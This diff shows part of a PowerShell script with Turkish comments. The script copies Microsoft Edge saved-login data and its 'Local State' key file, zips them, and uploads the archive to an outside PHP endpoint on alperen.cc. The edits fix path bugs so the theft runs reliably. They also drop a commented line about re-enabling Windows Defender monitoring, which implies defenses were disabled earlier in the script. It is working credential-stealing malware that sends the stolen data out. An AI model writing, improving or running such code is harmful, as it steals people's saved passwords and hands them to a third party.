@@ -53,20 +53,22 @@ $edgeFilesToCopy = @("Login Data")
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
 Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
 
-# Re-enable Windows Defender real-time monitoring (if needed)
-#Set-MpPreference -DisableRealtimeMonitoring $false
 # Sıkıştırmak istediğiniz klasörün yolu
-$folderPath = "%APPDATA%\BrowserData"
+$folderPath = "$env:APPDATA\BrowserData"
 
 # ZIP dosyasının hedef yolu
-$zipFilePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"
+$zipDestDir = "$env:APPDATA\ZippedBrowserData"
+if (-Not (Test-Path $zipDestDir)) {
+    New-Item -ItemType Directory -Path $zipDestDir
+}
+
+$zipFilePath = "$zipDestDir\BrowserData.zip"
 
 # Klasörü ZIP dosyasına sıkıştırma
-Compress-Archive -Path $folderPath\* -DestinationPath $zipFilePath
-
+Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
 
 # Yüklemek istediğiniz dosyanın yolu
-$filePath = "%APPDATA%\ZippedBrowserData\BrowserData.zip"
+$filePath = $zipFilePath
 
 # PHP dosya yükleme URL'si
 $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
@@ -81,8 +83,5 @@ $response = Invoke-RestMethod -Uri $url -Method Post -Form $form
 
 # Yanıtı yazdırma
 Write-Output $response
-
-
-
 
 exit
